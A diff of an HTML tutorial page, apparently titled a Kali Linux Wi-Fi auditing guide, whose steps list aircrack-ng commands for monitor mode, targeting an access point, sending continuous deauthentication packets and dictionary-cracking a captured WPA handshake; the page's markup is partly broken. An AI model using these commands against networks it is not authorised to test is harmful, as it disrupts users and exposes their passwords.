@@ -1,354 +1,374 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Kali Linux Wi-Fi Auditing Guide</title>
-  <style>
-    :root {
-      --bg-color: #f4f4f4;
-      --text-color: #222;
-      --card-bg: #ffffff;
-      --header-bg: linear-gradient(135deg, #2c3e50, #34495e);
-      --header-text: white;
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Kali Linux Wi-Fi Auditing Guide</title>
+    <style>
+        :root {
+            --bg-color: #f4f4f4;
+            --text-color: #222;
+            --card-bg: #ffffff;
+            --header-bg: linear-gradient(135deg, #2c3e50, #34495e);
+            --header-text: white;
+        }
 
-    body.dark-mode {
-      --bg-color: #121212;
-      --text-color: #e0e0e0;
-      --card-bg: #1e1e1e;
-      --header-bg: linear-gradient(135deg, #000428, #004e92);
-      --header-text: #ffffff;
-    }
+        body.dark-mode {
+            --bg-color: #121212;
+            --text-color: #e0e0e0;
+            --card-bg: #1e1e1e;
+            --header-bg: linear-gradient(135deg, #000428, #004e92);
+            --header-text: #ffffff;
+        }
 
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      margin: 0;
-      background: var(--bg-color);
-      color: var(--text-color);
-      transition: background 0.5s ease, color 0.5s ease;
-      animation: fadeIn 1s ease;
-    }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            background: var(--bg-color);
+            color: var(--text-color);
+            transition: background 0.5s ease, color 0.5s ease;
+            animation: fadeIn 1s ease;
+        }
 
-    @keyframes fadeIn {
-      from {opacity: 0; transform: translateY(20px);}
-      to {opacity: 1; transform: translateY(0);}
-    }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
 
-    header {
-      background: var(--header-bg);
-      color: var(--header-text);
-      text-align: center;
-      padding: 2rem 1rem;
-      font-size: 2rem;
-      position: relative;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
-    }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
 
-    .toggle-btn {
-      position: absolute;
-      right: 20px;
-      top: 20px;
-      background: #3498db;
-      color: white;
-      border: none;
-      padding: 0.6rem 1.2rem;
-      border-radius: 25px;
-      cursor: pointer;
-      font-weight: bold;
-      transition: all 0.3s ease;
-      box-shadow: 0 0 10px rgba(52, 152, 219, 0.5);
-    }
+        header {
+            background: var(--header-bg);
+            color: var(--header-text);
+            text-align: center;
+            padding: 2rem 1rem;
+            font-size: 2rem;
+            position: relative;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
 
-    .toggle-btn:hover {
-      background: #2980b9;
-      transform: scale(1.1);
-      box-shadow: 0 0 20px rgba(52, 152, 219, 0.8);
-    }
+        .toggle-btn {
+            position: absolute;
+            right: 20px;
+            top: 20px;
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 0.6rem 1.2rem;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 10px rgba(52, 152, 219, 0.5);
+        }
 
-    .container {
-      max-width: 900px;
-      margin: 2rem auto;
-      padding: 1rem;
-    }
+        .toggle-btn:hover {
+            background: #2980b9;
+            transform: scale(1.1);
+            box-shadow: 0 0 20px rgba(52, 152, 219, 0.8);
+        }
 
-    .accordion {
-      background-color: var(--card-bg);
-      border-radius: 15px;
-      margin-bottom: 1rem;
-      overflow: hidden;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.1);
-      transition: transform 0.3s ease;
-    }
+        .container {
+            max-width: 900px;
+            margin: 2rem auto;
+            padding: 1rem;
+        }
 
-    .accordion:hover {
-      transform: scale(1.01);
-    }
+        .accordion {
+            background-color: var(--card-bg);
+            margin: 0px 20px;
+            border-radius: 15px;
+            margin-bottom: 1rem;
+            overflow: hidden;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
 
-    .accordion h2 {
-      margin: 0;
-      font-size: 1.2rem;
-      padding: 1rem 1rem 1rem 2.5rem;
-      background: #2c3e50;
-      color: white;
-      cursor: pointer;
-      position: relative;
-      transition: background 0.3s ease;
-    }
+        .accordion:hover {
+            transform: scale(1.01);
+        }
 
-    .accordion h2::before {
-      content: "▶";
-      position: absolute;
-      left: 1rem;
-      top: 1.1rem;
-      transition: transform 0.3s ease;
-    }
+        .accordion h2 {
+            margin: 0;
+            font-size: 1.2rem;
+            padding: 1rem 1rem 1rem 2.5rem;
+            background: #2c3e50;
+            color: white;
+            cursor: pointer;
+            position: relative;
+            transition: background 0.3s ease;
+        }
 
-    .accordion h2.active::before {
-      transform: rotate(90deg);
-    }
+        .accordion h2::before {
+            content: "▶";
+            position: absolute;
+            left: 1rem;
+            top: 1.1rem;
+            transition: transform 0.3s ease;
+        }
 
-    .accordion-content {
-      padding: 0 1rem;
-      max-height: 0;
-      overflow: hidden;
-      background-color: var(--card-bg);
-      opacity: 0;
-      transform: translateY(-10px);
-      transition: max-height 0.5s ease, opacity 0.5s ease, transform 0.5s ease;
-    }
+        .accordion h2.active::before {
+            transform: rotate(90deg);
+        }
 
-    .accordion-content.show {
-      padding: 1rem;
-      max-height: 500px;
-      opacity: 1;
-      transform: translateY(0);
-    }
+        .accordion-content {
+            padding: 0 1rem;
+            max-height: 0;
+            overflow: hidden;
+            background-color: var(--card-bg);
+            opacity: 0;
+            transform: translateY(-10px);
+            transition: max-height 0.5s ease, opacity 0.5s ease, transform 0.5s ease;
+        }
 
-    .accordion-content pre {
-      background: #272822;
-      color: #f8f8f2;
-      padding: 0.5rem;
-      border-radius: 5px;
-      overflow-x: auto;
-    }
+        .accordion-content.show {
+            padding: 1rem;
+            max-height: 500px;
+            opacity: 1;
+            transform: translateY(0);
+        }
 
-    code {
-      background: rgba(0,0,0,0.05);
-      padding: 2px 6px;
-      border-radius: 5px;
-      font-family: monospace;
-    }
+        .accordion-content pre {
+            background: #272822;
+            color: #f8f8f2;
+            padding: 0.5rem;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
 
-    /* Video section styles */
-    .video-container {
-      background-color: var(--card-bg);
-      border-radius: 15px;
-      padding: 1.5rem;
-      margin: 2rem 0;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.1);
-      text-align: center;
-    }
+        code {
+            background: rgba(0, 0, 0, 0.05);
+            padding: 2px 6px;
+            border-radius: 5px;
+            font-family: monospace;
+        }
 
-    .video-container h2 {
-      margin-top: 0;
-      color: #2c3e50;
-      border-bottom: 2px solid #3498db;
-      padding-bottom: 0.5rem;
-      display: inline-block;
-    }
+        /* Video section styles */
+        .video-container {
+            background-color: var(--card-bg);
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
 
-    .video-wrapper {
-      position: relative;
-      padding-bottom: 56.25%; /* 16:9 aspect ratio */
-      height: 0;
-      overflow: hidden;
-      margin-top: 1.5rem;
-      border-radius: 10px;
-      background-color: #000;
-    }
+        .video-container h2 {
+            margin-top: 0;
+            color: #2c3e50;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 0.5rem;
+            display: inline-block;
+        }
 
-    .video-wrapper iframe {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      border: none;
-    }
+        .video-wrapper {
+            position: relative;
+            padding-bottom: 56.25%;
+            /* 16:9 aspect ratio */
+            height: 0;
+            overflow: hidden;
+            margin-top: 1.5rem;
+            border-radius: 10px;
+            background-color: #000;
+        }
 
-    body.dark-mode .video-container h2 {
-      color: #e0e0e0;
-    }
+        .video-wrapper iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
 
-    .video-description {
-      margin-top: 1rem;
-      font-style: italic;
-      color: #666;
-    }
+        body.dark-mode .video-container h2 {
+            color: #e0e0e0;
+        }
 
-    body.dark-mode .video-description {
-      color: #aaa;
-    }
+        .video-description {
+            margin-top: 1rem;
+            font-style: italic;
+            color: #666;
+        }
 
-    .video-fallback {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      color: white;
-      background-color: #333;
-    }
+        body.dark-mode .video-description {
+            color: #aaa;
+        }
 
-    .video-fallback a {
-      color: #3498db;
-      text-decoration: none;
-      margin-top: 10px;
-    }
+        .video-fallback {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            background-color: #333;
+        }
 
-    .video-fallback a:hover {
-      text-decoration: underline;
-    }
-  </style>
+        .video-fallback a {
+            color: #3498db;
+            text-decoration: none;
+            margin-top: 10px;
+        }
+
+        .video-fallback a:hover {
+            text-decoration: underline;
+        }
+        .des{
+            margin: 0px 20px;
+        }
+    </style>
 </head>
+
 <body>
 
-  <header>
-    Kali Linux Wi-Fi Auditing Guide
-    <button class="toggle-btn" onclick="toggleDarkMode()">Toggle Mode</button>
-  </header>
+    <header>
+        Kali Linux Wi-Fi Auditing Guide
+        <button class="toggle-btn" onclick="toggleDarkMode()">Toggle Mode</button>
+    </header>
 
-  <div class="container">
+    <div class="container">
 
-    <!-- Video Demonstration Section -->
+        <!-- Video Demonstration Section -->
 
-</div>
+    </div>
 
-</video>
-
-</video>
-
-</video>
-        <div class="video-fallback" style="display: none;">
-          <p>Video unavailable in your region</p>
-          <a href="https://www.youtube.com/watch?v=8DkCgzZf4jY" target="_blank">Watch on YouTube</a>
-        </div>
-      </div>
-      <!-- Video Demonstration Section -->
-<div class="video-container">
-  <h2>Video Demonstration</h2>
-  <div class="video-wrapper">
-    <video controls>
-      <source src="v.html.mp4" type="video/mp4">
-      Your browser does not support the video tag.
     </video>
-  </div>
-  <div class="video-fallback" style="display: none;">
-    <p>Video unavailable in your region</p>
-    <a href="https://www.youtube.com/watch?v=8DkCgzZf4jY" target="_blank">Watch on YouTube</a>
-  </div>
-  <p class="video-description">
-    This tutorial demonstrates all key steps: monitor mode activation, network scanning, targeting, deauthentication, and WPA handshake capture.
-  </p>
-  <p><em>Note: This content is for educational and authorized security testing only.</em></p>
-</div>
 
-      <p class="video-description">This tutorial demonstrates all key steps: monitor mode activation, network scanning, targeting, deauthentication, and WPA handshake capture.</p>
-      <p><em>Note: This content is for educational and authorized security testing only.</em></p>
+    </video>
+
+    </video>
+    <div class="video-fallback" style="display: none;">
+        <p>Video unavailable in your region</p>
+        <a href="https://www.youtube.com/watch?v=8DkCgzZf4jY" target="_blank">Watch on YouTube</a>
+    </div>
+    </div>
+    <!-- Video Demonstration Section -->
+    <div class="video-container">
+        <h2>Video Demonstration</h2>
+        <div class="video-wrapper">
+            <video controls>
+                <source src="v.html.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="video-fallback" style="display: none;">
+            <p>Video unavailable in your region</p>
+            <a href="https://www.youtube.com/watch?v=8DkCgzZf4jY" target="_blank">Watch on YouTube</a>
+        </div>
+        <p class="video-description">
+            This tutorial demonstrates all key steps: monitor mode activation, network scanning, targeting,
+            deauthentication, and WPA handshake capture.
+        </p>
+        <p><em>Note: This content is for educational and authorized security testing only.</em></p>
+    </div>
+
+    <div class="des">
+        <p class="video-description">This tutorial demonstrates all key steps: monitor mode activation, network scanning,
+        targeting, deauthentication, and WPA handshake capture.</p>
+    <p><em>Note: This content is for educational and authorized security testing only.</em></p>
+    </div>
     </div>
 
     <div class="accordion">
-      <h2 onclick="toggleAccordion(this)">1. iwconfig</h2>
-      <div class="accordion-content">
-        <pre>iwconfig</pre>
-        <p>Check wireless interfaces and their current mode. Identify <code>wlan0</code> or other adapters.</p>
-      </div>
+        <h2 onclick="toggleAccordion(this)">1. iwconfig</h2>
+        <div class="accordion-content">
+            <pre>iwconfig</pre>
+            <p>Check wireless interfaces and their current mode. Identify <code>wlan0</code> or other adapters.</p>
+        </div>
     </div>
 
     <div class="accordion">
-      <h2 onclick="toggleAccordion(this)">2. Start Monitor Mode</h2>
-      <div class="accordion-content">
-        <pre>sudo airmon-ng start wlan0</pre>
-        <p>Enable monitor mode on <code>wlan0</code>, transforming it into <code>wlan0mon</code>.</p>
-      </div>
+        <h2 onclick="toggleAccordion(this)">2. Start Monitor Mode</h2>
+        <div class="accordion-content">
+            <pre>sudo airmon-ng start wlan0</pre>
+            <p>Enable monitor mode on <code>wlan0</code>, transforming it into <code>wlan0mon</code>.</p>
+        </div>
     </div>
 
     <div class="accordion">
-      <h2 onclick="toggleAccordion(this)">3. Confirm Monitor Mode</h2>
-      <div class="accordion-content">
-        <pre>iwconfig</pre>
-        <p>Ensure your interface is now operating in monitor mode.</p>
-      </div>
+        <h2 onclick="toggleAccordion(this)">3. Confirm Monitor Mode</h2>
+        <div class="accordion-content">
+            <pre>iwconfig</pre>
+            <p>Ensure your interface is now operating in monitor mode.</p>
+        </div>
     </div>
 
     <div class="accordion">
-      <h2 onclick="toggleAccordion(this)">4. Scan for Networks</h2>
-      <div class="accordion-content">
-        <pre>sudo airodump-ng wlan0mon</pre>
-        <p>Displays SSIDs, BSSIDs, signal levels, encryption, and clients connected.</p>
-      </div>
+        <h2 onclick="toggleAccordion(this)">4. Scan for Networks</h2>
+        <div class="accordion-content">
+            <pre>sudo airodump-ng wlan0mon</pre>
+            <p>Displays SSIDs, BSSIDs, signal levels, encryption, and clients connected.</p>
+        </div>
     </div>
 
     <div class="accordion">
-      <h2 onclick="toggleAccordion(this)">5. Target Specific Network</h2>
-      <div class="accordion-content">
-        <pre>sudo airodump-ng -c [channel] --bssid [target BSSID] -w /root wlan0mon</pre>
-        <p>Capture packets only from a selected access point.</p>
-      </div>
+        <h2 onclick="toggleAccordion(this)">5. Target Specific Network</h2>
+        <div class="accordion-content">
+            <pre>sudo airodump-ng -c [channel] --bssid [target BSSID] -w /root wlan0mon</pre>
+            <p>Capture packets only from a selected access point.</p>
+        </div>
     </div>
 
     <div class="accordion">
-      <h2 onclick="toggleAccordion(this)">6. Send Deauth Packets</h2>
-      <div class="accordion-content">
-        <pre>sudo aireplay-ng --deauth 0 -a [BSSID] wlan0mon</pre>
-        <p>Disconnects clients to trigger a handshake when they reconnect.</p>
-      </div>
+        <h2 onclick="toggleAccordion(this)">6. Send Deauth Packets</h2>
+        <div class="accordion-content">
+            <pre>sudo aireplay-ng --deauth 0 -a [BSSID] wlan0mon</pre>
+            <p>Disconnects clients to trigger a handshake when they reconnect.</p>
+        </div>
     </div>
 
     <div class="accordion">
-      <h2 onclick="toggleAccordion(this)">7. Crack WPA Handshake</h2>
-      <div class="accordion-content">
-        <pre>sudo aircrack-ng -w rockyou.txt root-06.cap</pre>
-        <p>Use a dictionary attack with <code>rockyou.txt</code> to crack the password from the handshake capture.</p>
-      </div>
+        <h2 onclick="toggleAccordion(this)">7. Crack WPA Handshake</h2>
+        <div class="accordion-content">
+            <pre>sudo aircrack-ng -w rockyou.txt root-06.cap</pre>
+            <p>Use a dictionary attack with <code>rockyou.txt</code> to crack the password from the handshake capture.
+            </p>
+        </div>
     </div>
 
-  </div>
+    </div>
 
-  <script>
-    function toggleAccordion(header) {
-      const content = header.nextElementSibling;
-      const isOpen = content.classList.contains('show');
+    <script>
+        function toggleAccordion(header) {
+            const content = header.nextElementSibling;
+            const isOpen = content.classList.contains('show');
 
-      document.querySelectorAll('.accordion h2').forEach(h => h.classList.remove('active'));
-      document.querySelectorAll('.accordion-content').forEach(c => c.classList.remove('show'));
+            document.querySelectorAll('.accordion h2').forEach(h => h.classList.remove('active'));
+            document.querySelectorAll('.accordion-content').forEach(c => c.classList.remove('show'));
 
-      if (!isOpen) {
-        content.classList.add('show');
-        header.classList.add('active');
-      }
-    }
+            if (!isOpen) {
+                content.classList.add('show');
+                header.classList.add('active');
+            }
+        }
 
-    function toggleDarkMode() {
-      document.body.classList.toggle('dark-mode');
-    }
+        function toggleDarkMode() {
+            document.body.classList.toggle('dark-mode');
+        }
 
-    // Fallback for iframe loading issues
-    document.addEventListener('DOMContentLoaded', function() {
-      const iframe = document.querySelector('.video-wrapper iframe');
-      const fallback = document.querySelector('.video-fallback');
+        // Fallback for iframe loading issues
+        document.addEventListener('DOMContentLoaded', function () {
+            const iframe = document.querySelector('.video-wrapper iframe');
+            const fallback = document.querySelector('.video-fallback');
 
-      iframe.onerror = function() {
-        iframe.style.display = 'none';
-        fallback.style.display = 'flex';
-      };
-    });
-  </script>
+            iframe.onerror = function () {
+                iframe.style.display = 'none';
+                fallback.style.display = 'flex';
+            };
+        });
+    </script>
 
 </body>
+
 </html>
